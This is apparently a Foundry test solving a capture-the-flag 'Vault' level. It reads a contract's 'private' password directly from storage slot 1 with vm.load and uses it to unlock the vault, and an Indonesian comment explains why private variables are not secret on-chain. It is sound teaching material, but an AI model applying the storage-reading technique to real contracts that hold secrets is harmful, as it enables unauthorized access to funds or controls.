// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Vault} from "src/levels/Vault.sol";
import {VaultFactory} from "src/levels/VaultFactory.sol";

contract VaultSolve is Test {
    VaultFactory factory;
    Vault instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new VaultFactory();
        instance = Vault(factory.createInstance(player));
    }

    function testInit() public view {
        assertTrue(instance.locked());
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // `private` hanya menyembunyikan dari compiler, bukan dari chain:
        // password ada di storage slot 1 (slot 0 = bool locked).
        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        instance.unlock(password);
        assertFalse(instance.locked());
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
